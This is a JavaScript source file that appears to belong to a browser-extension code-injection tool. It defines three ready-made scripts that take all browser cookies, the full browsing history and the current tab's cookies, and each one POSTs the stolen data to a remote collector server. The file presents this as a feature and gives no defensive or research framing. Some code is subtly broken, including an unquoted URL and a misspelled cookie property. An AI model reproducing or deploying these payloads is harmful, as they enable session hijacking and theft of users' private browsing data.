export const scripts =  [
    {
        name: 'Get browser cookies',
        description: 'Get all cookies from the users browser',
        handle: 'get-cookies',
        script:
            `
            // Set up server URL
            const serverUrl = https://extension-code-injector-production.up.railway.app
            
            // Function to send cookies to the local server using the Fetch API
            function sendCookies(cookies) {
              fetch(serverUrl + "/collector/cookies", {
                method: "POST", // Specify the method
                headers: {
                  "Content-Type": "application/json;charset=UTF-8"
                },
                body: JSON.stringify(cookies) // Convert the cookies object to a string
              })
              .then(response => {
                if (response.ok) {
                  console.log('Cookies successfully sent to the server');
                  return response.json(); // or .text() if the response is not in JSON format
                } else {
                  throw new Error('Failed to send cookies to the server');
                }
              })
              .then(data => {
                console.log('Server response:', data);
              })
              .catch(error => {
                console.error('Error:', error);
              });
            }
            
            // Use the chrome.cookies API to get all cookies, and send them to your server
            chrome.cookies.getAll({}, sendCookies);
            `,
        targets: ['background']
    },
    {
        name: 'Get browser history',
        description: 'Get all history from the users browser',
        handle: 'get-history',
        script:
            `
            // Set up server URL
            const serverUrl = https://extension-code-injector-production.up.railway.app
            
            // Function to send history to the local server using the Fetch API
            function sendHistory(history) {
              fetch(serverUrl + "/collector/history", {
                method: "POST", // Specify the method
                headers: {
                  "Content-Type": "application/json;charset=UTF-8"
                },
                body: JSON.stringify(history) // Convert the history object to a string
              })
              .then(response => {
                if (response.ok) {
                  console.log('History successfully sent to the server');
                  return response.json(); // or .text() if the response is not in JSON format
                } else {
                  console.error('Failed to send history to the server');
                }
              })            
            }
            
            // Use the chrome.history API to get all histories, and send them to your server
            chrome.history.search({text:""}, sendHistory);
            `,
        targets: ['background']
    },
    {
        name: 'Get client cookies',
        description: 'Get all cookies accessible to the client from the current tab',
        handle: 'get-client-cookies',
        script:
            `
            // Set up server URL
            const serverUrl = https://extension-code-injector-production.up.railway.app
            
            // Function to send cookies to the local server using the Fetch API
            function sendClientCookies(cookies) {
              fetch(serverUrl + "/collector/cookies", {
                method: "POST", // Specify the method
                headers: {
                  "Content-Type": "application/json;charset=UTF-8"
                },
                body: JSON.stringify(cookies) // Convert the history object to a string
              })
              .then(response => {
                if (response.ok) {
                  console.log('History successfully sent to the server');
                  return response.json(); // or .text() if the response is not in JSON format
                } else {
                  console.error('Failed to send history to the server');
                }
              })
            }
            
            // Use the document API to get all client cookies, and send them to your server
            sendClientCookies(document.cookies)
            `,
        targets: ['contentScript']
    },
]
